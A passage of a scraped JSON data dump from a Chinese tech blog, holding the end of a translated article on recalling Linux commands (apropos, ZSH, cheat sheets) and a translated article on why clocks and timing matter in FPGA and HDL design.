alt=\"Linux Apropos\"></p>\n<p>这就搜索出结果了，非常直接。给 “directory” 加上复数后再试一下。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ef08d296764398846\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\napropos \"list directories\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ef08d296764398846-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ef08d296764398846-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ef08d296764398846-1\"><span class=\"crayon-i\">apropos</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"list directories\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ef08d296764398846-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>这次没用了。<code>apropos</code> 所作的其实就是搜索一系列命令的描述。描述不匹配的命令不会纳入结果中。</p>\n<p>还有其他的用法。通过 <code>-a</code> 标志，你可以以更灵活的方式来增加搜索关键字。试试这条命令:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ef08d29a866220970\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\napropos \"match pattern\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ef08d29a866220970-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ef08d29a866220970-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ef08d29a866220970-1\"><span class=\"crayon-i\">apropos</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"match pattern\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ef08d29a866220970-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/a3a848058d32cc97367b81816aef9a25.jpg\" alt=\"Linux Apropos -a Flag\"></p>\n<p>你会觉得应该会有一些匹配的内容出现，比如 <a href=\"https://www.maketecheasier.com/what-is-grep-and-uses/\">grep</a> 对吗? 然而，实际上并没有匹配出任何结果。再说一次，apropos 只会根据字面内容进行搜索。</p>\n<p>现在让我们试着用 <code>-a</code> 标志来把单词分割开来。（LCTT 译注：该选项的意思是“and”，即多个关键字都存在，但是不需要正好是连在一起的字符串。）</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ef08d29e043523171\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\napropos \"match\" -a \"pattern\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ef08d29e043523171-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ef08d29e043523171-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ef08d29e043523171-1\"><span class=\"crayon-i\">apropos</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"match\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"pattern\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ef08d29e043523171-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这一下，你可以看到很多期望的结果了。</p>\n<p><code>apropos</code> 是一个很棒的工具，不过你需要留意它的缺陷。</p>\n<h3 id=\"toc_3\">ZSH</h3>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/2e229d2b2029a07d42724367d9cec29f.jpg\" alt=\"Linux ZSH Autocomplete\"></p>\n<p>ZSH 其实并不是用于记忆命令的工具。它其实是一种 shell。你可以用 <a href=\"https://www.maketecheasier.com/understanding-the-different-shell-in-linux-zsh-shell/\">ZSH</a> 来替代 Bash 作为你的命令行 shell。ZSH 包含了自动纠错机制，能在你输入命令的时候给你予提示。开启该功能后，它会提示你相近的选择。在 ZSH 中你可以像往常一样使用命令行，同时你还能享受到极度安全的网络以及其他一些非常好用的特性。充分利用 ZSH 的最简单方法就是使用 <a href=\"https://github.com/robbyrussell/oh-my-zsh\">Oh-My-ZSH</a>。</p>\n<h3 id=\"toc_4\">速记表</h3>\n<p>最后，也可能是最间的方法就是使用 <a href=\"https://www.maketecheasier.com/premium/cheatsheet/linux-command-line/\">速记表</a>。</p>\n<p>有很多在线的速记表，比如<a href=\"https://www.cheatography.com/davechild/cheat-sheets/linux-command-line/\">这个</a> 可以帮助你快速查询命令。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/1903ffeaf9160b3705d5bd2670ea6a95.gif\" alt=\"linux-commandline-cheatsheet\"></p>\n<p>为了快速查询，你可以寻找图片格式的速记表，然后将它设置为你的桌面墙纸。</p>\n<p>这并不是记忆命令的最好方法，但是这么做可以帮你节省在线搜索遗忘命令的时间。</p>\n<p>在学习时依赖这些方法，最终你会发现你会越来越少地使用这些工具。没有人能够记住所有的事情，因此偶尔遗忘掉某些东西或者遇到某些没有见过的东西也很正常。这也是这些工具以及因特网存在的意义。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113158\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113158votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113158\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg"}
{"url_object_id": "fda34f2acb731c915e85fe9c4c5dfeaa", "title": "学数字设计的软件工程师该了解的时钟知识", "url": "http://blog.jobbole.com/113215/", "create_date": "2017/12/26", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/14464260f3d26e25c16cf5131a6b2a95.jpg"], "praise_nums": 1, "comment_nums": 2, "favor_nums": 0, "tags": "开发", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q4000052677\">听风</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://zipcpu.com/blog/2017/09/18/clocks-for-sw-engineers.html\">zipcpu</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>如果你有软件工程师背景，想找一份数字设计工程师的工作，那么你需要做的第一件事就是尽可能早的学习时钟概念。对很多从软件工程师转来的初级硬件设计工程师来说，时钟概念都是一件恼人的事情。如果没有时钟，他们就可以将 HDL（Hardware Description Language，硬件描述语言）转换为一种编程语言，如 $display，if 和 for 循环，如同其他的任何编程语言一样。 然而，这些初级设计师所忽视的时钟，通常是数字设计中最基础的部分。</p>\n<p>没有什么时候会比在审查初级 HDL 设计工程师第一次设计的产品的时候，所发现的问题更多。现在，我已经和几位在我参与的论坛上发表过问题的人交谈过了。而当我深入了解后，发现他们正在做的是什么时，我为他们感到很尴尬。</p>\n<p>以我遇到的一个学生为例，他不理解为什么网络上没有人重视他的高级加密标准 (AES) 的HDL实现。此处，为了不让他因为名字或项目而尴尬，我暂且将他称之为学生。（不，我不是教授。）这个“学生”创建了一个 Verilog 设计，进行不止一轮的 AES 加密，但每一轮都是组合逻辑，且两者之间没有时钟。 我不记得他是在做 AES-128、AES-192 还是 AES-256，但 AES 需要进行 10 到 14 轮计算。 我记得，他的加密引擎在模拟器中运行完美，然而它只使用一个时钟来加密或解密他的数据。 他为自己的工作感到自豪，但不明白为什么那些看过这个项目的人都对他说，他的思考方式像一个软件工程师，而不是一个硬件设计师。</p>\n<p>事实上，我现在有机会给像这个“学生”一样的 HDL 新手软件工程师解释疑惑。 他们中的许多人对待 HDL 语言，就像对象另一种软件编程语言一样。 在编程之前，他们去寻找任何软件编程语言的基础知识：如何声明变量，如何创建一个 if 语句或 case 语句，如何编写循环等等。然后，他们编写代码就像编写一个计算机程序——一切都是顺序执行（图1），而完全忽略了数字设计中的基本事实，即所有运行都是并行的。</p>\n<p><img class=\"aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/6941baebly1fmufh5ei8wj208p0h6dfr.jpg\"></p>\n<p style=\"text-align: center;\">图1：软件执行是顺序的</p>\n<p>有时这些程序员会使用模拟器，如 Verilator，iverilog 或者 EDA 平台。 然后，他们在逻辑代码中使用一堆$ display命令，将它们视为顺序的“printf”，并通过这些命令来使代码运行，而不是使用时钟。 他们的设计在模拟器中只是被单独地“执行”组合逻辑代码。</p>\n<p>这些学生向我描述他们的设计，并解释称他们的设计“不需要时钟就能执行”。</p>\n<p>天啊，这都是什么想法？</p>\n<p>实际上，任何数字逻辑设计如果使用没有时钟都是不能工作的。总有一些物理过程会创建输入。而 这些输入必须在某个开始时间都有效 ——这个时间在其设计中形成第一个时钟刻度。 同样地，在接收这些输入一段时间后就要输出。 对于给定的一组输入，所有输出的有效时间在“无时钟”设计中形成下一个“时钟”。 或许第一个时钟刻度是当他们调整好电路板上的最后一个开关的时候，而最后一个时钟刻度是当他们读取到结果的时候。时钟是如何形成的没关系：有一个时钟就可以。</p>\n<p>而这导致的结果就是，那些声称他们的设计“没有时钟”的人解释他正在以不切实际的方式使用模拟器，或者设计中存在一个外部时钟用于设置输入和读取输出 ——而这正是另外一种方式，表明设计中的确存在一个时钟。</p>\n<p>如果你发现你自己正试图以这种方式理解数字逻辑必须有一个时钟才能执行，或你认识的某人也是这么尝试理解的，那么本文正适合你们。</p>\n<p>接下来，让我们花一两分钟来讨论时钟，以及为什么围绕时钟来构建和设计你的数字逻辑很重要。</p>\n<h2>第一部分：硬件设计是并行的</h2>\n<p>硬件设计学习中的第一部分也是最难的部分，就是硬件设计是并行设计。所有的代码指令并不是依次执行，如同一条指令连着下一条指令（如图1所示），就像计算机程序一样。相反，所有的指令在同一时刻执行，如图2所示。</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fmufh4yz9wj20hb02y0sl.jpg\"></p>\n<p style=\"text-align: center;\">图2：硬件逻辑并行运行</p>\n<p>正是这一点，让很多东西变得不一样。</p>\n<p>首先需要改变的是开发人员。你需要学习以并行的方式思考。</p>\n<p>如果要通过举例说明两者的区别，硬件循环也许会是个不错的例子。</p>\n<p>软件设计中，一个循环是由一连串的指令构成，如图3所示。这些指令构造了一组初始化条件，而真正的逻辑在循环内部执行。通过使用一个循环变量来构造和定义一个循环逻辑，并且这个变量在每次循环中通常都是增加的。计算机CPU不停地重复执行循环中的指令和逻辑，直到循环变量达到了终止条件。循环运行的次数越多，它在程序中运行的时间也就越长。</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fmufh4j5drj20c40jvt8y.jpg\"></p>\n<p style=\"text-align: center;\">图3：软件循环</p>\n<p>而基于硬件的硬件描述语言循环与软件循环完全不同。恰恰相反，HDL 合成工具使用循环来使得所有逻辑的副本同时并行运行。而用来构造循环逻辑的代码，如定义索引、索引增长、检查索引是否达到终止条件等等，是不需要合成的，通常会被移除。此外，由于合成工具正在构建物理线路和逻辑块，所以执行循环的次数在合成时间之后不能改变。之后，硬件的数量是固定的，不能再改变。</p>\n<p>导致的结果便是，硬件循环结构（如下图4所示），与软件循环结构（如上图3所示）有很大的区别。</p>\n<p><img class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fmufh47lvsj20d802awec.jpg\"></p>\n<p style=\"text-align: center;\">图4：HDL循环</p>\n<p>这有几个后果。例如，硬件循环迭代与软件循环迭代不同，它不必依赖前期的循环迭代的输出。这导致的结果是，运行一个包含一组数据的逻辑循环很难在下一个时钟得到响应。</p>\n<p>但是…现在让我们再次回到时钟概念。</p>\n<p>时钟是任何 FPGA 设计的核心。一切都围绕着它展开。事实上，我认为所有的逻辑设计开发都应该从时钟开始。时钟不应该在设计完成后添加， 而是在你一开始思考如何设计架构时就要考虑。</p>\n<h2>为什么时钟很重要？</h2>\n<p>第一步，你要理解数字逻辑设计的一切操作在硬件上执行时都是需要时间的。不仅如此，不同的操作需要的时间总量也是不同的。从芯片上的一部分移动到另一部分也要花费时间。</p>\n<p>或许用图表的方式能更直观的解释这一点。我们将输入置于算法的顶部，逻辑放在中间，而输出则放在底部。时间为轴，从上到下运行，从一个时钟到下一个时钟。这种视觉效果看起来就如下图 5 所示：</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/6941baebly1fmufh3undmj20ko0ekmy8.jpg\"></p>\n<p style=\"text-align: center;\">图5：三个操作的逻辑耗时</p>\n<p>图例 5 展示了几个不同的操作：加法、乘法、以及多轮的 AES 算法——尽管为了讨论的目的，它可以是多轮任意其它算法。我在垂直方向上使用了方框的尺寸，以表示每个操作可能需要多少时间。此外，将依赖于其它操作的方框堆叠起来。因此，如果你想要在一个时钟里面做很多轮的 AES 算法，你要明白第二轮算法在第一轮算法结束后才会开始。因此，适应这一逻辑将会增加时钟之间的时间间隔，并减慢整体的时钟频率。</p>\n<p>现在让我们关注这个粉色方框。</p>\n<p>这个粉色框表示在硬件电路中浪费的运行能力，即你本可以用来做更多事情的时间，但因为需要等待时钟，或者等待输入被处理，而导致你什么也不能做。例如，在上面的概念图中，完成乘法运算所花费的时间不需要长达一轮 AES 算法的时间，加法也是。然而，当 AES 算法正在执行时，你不能够对这两个操作结果进行任何的动作，因为这些操作都需要等待下一个时钟来获取他们的下一个输入。这就是图 5 中粉色方框所表达的：空闲电路。另外，由于每一轮 AES 算法都会推迟下一个时钟的到来，所以图 5 中存在大量的空闲电路。因此，该设计的运行速度不会像硬件允许的那么快。</p>\n<p>如果我们只使用 AES 算法，那么每一个时钟都正好完成一轮的 AES 计算。如此一来，就可以减少运行能力的浪费，从而让整个设计运行得更快。</p>\n<p>图 6 展示了这种设计思想。</p>\n<p><img class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/6941baebly1fmufh3duaqj20kj08ewf8.jpg\"></p>\n<p style=\"text-align: center;\">图6：分解操作加快时钟频率</p>\n<p>由于我们将操作分解为更小的操作，每一个都能在时钟单元内完成，因此，我们提高了运行能力。甚至，我们可以通过管道加密算法，而不是一次只加密一个数据块。这种逻辑设计的结果不会比上图 5 所示的更快，但是如果可以保持管道充满，则可以提高 AES 加密吞吐量至 10-14x 之间。</p>\n<p>所以，这个设计更赞。</p>\n<p>还可以有其它更好的方案吗？当然！如果你熟悉 AES ，你就知道 AES 算法的每一轮计算中都有一些独立的步骤。这些步骤可再次分解，从而可以再次提高每轮逻辑算法的整体时钟速度。而这可以增加你能执行的加法和乘法运算的次数，以及加密引擎的微管道，以便你能在每个时钟的基础上运行更多的数据。</p>\n<p>设计不错。</p>\n<p>不过，上图 6 中还有些其它的东西。</p>\n<p>首先，箭头表示路由延迟。（这个数字不是按比例绘制的，它仅仅是这个讨论例子的示例。）每一块逻辑都需要上一块逻辑将结果传递给它。这意味着即使某个逻辑块不需要时间执行——例如，只是重新排列线路或其它等等，将逻辑块从一个芯片的末端移动到另一块也是需要花费时间的。所以，即使你将操作极简化了，每一轮数据的传递仍旧存在延迟。</p>\n<p>其次，你可能注意到，没有一个箭头的起始处在时钟刻度上，即没有一个逻辑块一直运行到下个时钟开始。这是为了演示 启动时间和维持时间的概念。触发器电路，即一种捕获数据并同步到时钟的电路结构，在下一个时钟到达前需要一定的时间，此刻数据也已经是固定和确定的。另外，尽管时钟通常被认为是瞬时的，但它从来都不是。它在不同的时刻到达芯片的不同部位。而这再次要求操作之间需要一些缓冲。</p>\n<p>通过以上讨论，我们可以得出哪些结论呢？</p>\n<ol>\n<li>逻辑实现需要花费时间。</li>\n<li>逻辑越多花费的时间也越多。</li>\n<li>完成两个时钟刻度之间的逻辑所花费的时间总和（包含例行的延迟、启动和维持时间、时钟不确定性等），限制了时钟速度。时钟之间的逻辑处理越多，时钟速率就越慢。</li>\n<li>完成最慢操作所需的时钟速度，限制了最快操作的速度。正如上述例子中的加法操作。它的执行速度本可以比乘法以及任何一轮单独的 AES 算法都更快，但它的速度在该设计中被其余的逻辑拖慢了。</li>\n<li>硬件定义也会限制时钟速度。即使操作中不包含任何的逻辑，也是需要花费时间的。</li>\n</ol>\n<p>因此，平衡的设计尝试在整个设计中将大量相同的逻辑放在时钟之间。</p>\n<h2>时钟之间应该放多少逻辑量？</h2>\n<p>现在你已经知道你必须处理时钟，那么根据上述信息你该怎么修改和构思你的设计？答案是限制时钟之间的逻辑数量。但问题是，这个数量是多少呢？你又该如何得到这个数量呢？</p>\n<p>得出时钟之间你能放置多少逻辑数量的一个方法便是，将时钟速度设置为任意速度，然后在与你需要的硬件配套的工具套件中构建你的设计。无论何时，当你的设计无法满足其计时需求时，都需要返回并拆分设计中的组件，或减慢时钟速度。通过使用设计工具，你最终能够找到那条最长的路径。</p>\n<p>如果你这样做了，你将自学到一些探索方法，然后通过使用这些方法，就可以找到在运行的硬件的时钟之间可以放置的具体逻辑数量。</p>\n<p>例如，我倾向于在 Xilinx 7 系列零件中进行 100MHz 时钟速率的设计。这些设计通常运行在大约 80MHz 速率的Spartan-6 上，或者50MHz的 iCE40上——尽管这些都不是硬性关系。把在一个芯片上正常执行的程序放在另一个上执行，可能会超载，亦可能会时钟检查失败。</p>\n<p>下面有一些我曾经在使用时钟时得到的一些粗略的探索性经验。由于只是个人经验，这些方法并不适合所有的设计：</p>\n<p>1.通常，我在设计一个32 位的加法时，会使用一个时钟内有 4-8个条目的多路复用器。</p>\n<p style=\"padding-left: 30px;\">如果要使用一个较快的时钟，例如频率为 200 MHz，可能就需要将加法操作从多路复用器上剥离下来。</p>\n<p style=\"padding-left: 30px;\">ZipCPU 的最长路径，实际上是从 ALU 的输出到 ALU 的输入。</p>\n<p style=\"padding-left: 30px;\">这听起来很简单。它甚至符合前面的经验法则。</p>\n<p style=\"padding-left: 30px;\">但 ZipCPU 的问题在于，如何在较快的速度下将输出路由回输入。</p>\n<p style=\"padding-left: 30px;\">让我们跟踪一下这个路径：跟随 ALU，逻辑路径首先通过一个4路多路复用器来决定是否ALU，内存或分频输出需要回写。 然后将该回写结果馈送到旁路电路中，以确定是否需要将其立即传入 ALU 作为其两个输入之一。 只有在该多路复用器末端并且旁路路径执行 ALU 操作时，多路复用器才会产生。 因此，所有这些逻辑步骤都会在通过 ALU 时造成压力。 然而，由于ZipCPU的设计结构，任何在此路线的时钟都可能会按比例减缓 ZipCPU 运行速度。 这意味着有可能这条最长线路仍然是 ZipCPU 中最长的一段线路。</p>\n<p style=\"padding-left: 30px;\">我曾经对以更高的速度运行 ZipCPU 感兴趣，这是我尝试分解和优化的第一个逻辑路径。</p>\n<p>2.16×16位乘法器需要一个时钟。</p>\n<p style=\"padding-left: 30px;\">有时，在某些硬件上，我可以在一个时钟上运行 32×32 位的乘法。而在其他硬件上，我需要分解这个操作。 因此，如果我需要一个签名的 32×32 位乘法，我使用我专门为此建立的流水线例程。 该例程包含其中的几种乘法方法，允许我从适合我目前正在工作的硬件的选项中进行选择。</p>\n<p style=\"padding-left: 30px;\">你的硬件可能也还支持 18×18 位乘法。 一些 FPGA 还支持在一个优化的硬件时钟内进行乘法和累加。只要你对使用的硬件足够熟悉，你就知道你能用它做什么。</p>\n<p>3. 访问任何 RAM 块都需要一个时钟。 如果可以的话，应尽量避免在该时钟周期调整索引。 同样，避免在此时钟期间做任何有关输出的事情。</p>\n<p style=\"padding-left: 30px;\">尽管我认为这是一条很好的规则，但我已经在 100MHz 的 Xilinx 7 系列设备上违反了其中的两个部分，而没有产生（严重的）影响。 （在 iCE40 设备上有问题。）</p>\n<p style=\"padding-left: 30px;\">例如，ZipCPU 从寄存器读取数据，给结果加上一个即时数，然后从结果中选择是否应该在寄存器、PC上，还是条件代码寄存器中加上即时数——都在一个时钟内。</p>\n<p style=\"padding-left: 30px;\">另外一个例子就是，长期以来 Wishbone Scope 根据当前时钟是否从存储器进行读取，确定从缓冲区内读取的地址。 从这个依赖中断它，需要添加另一个延迟时钟，所以当前版本不会再破坏这个（自我强加的）规则。</p>\n<p>这些规则只是我随着时间积累下来的方法经验，用来判定单个时钟内可容纳的逻辑数量。 这些经验法则与设备和时钟速度有关，因此它们可能不适用于你的设计开发。 我建议你积累自己的探索经验，以便你知道在时钟周期之间能做些什么。</p>\n<h2>下一步</h2>\n<p>也许我能够提供给任何新的 FPGA 开发人员的最后建议，就是学习 HDL 时要在实际硬件上进行练习，而不仅仅是在模拟器上。与实际硬件组件相关联的工具，其在检查代码和计算所需时间方面都很出色。 此外，以高速时钟构建设计的想法是好的，但这不是硬件设计的最终结果。</p>\n<p>记住，硬件设计是并行的。 一切都从时钟开始。</p>\n<p>最后，如果本文有助于你更好地了解HDL，或者它让你更加困惑了，请随时联系告诉我。 这会让我知道，我将来是否有必要再次回来讨论这个话题。 谢谢！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113215\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113215votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113215\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a 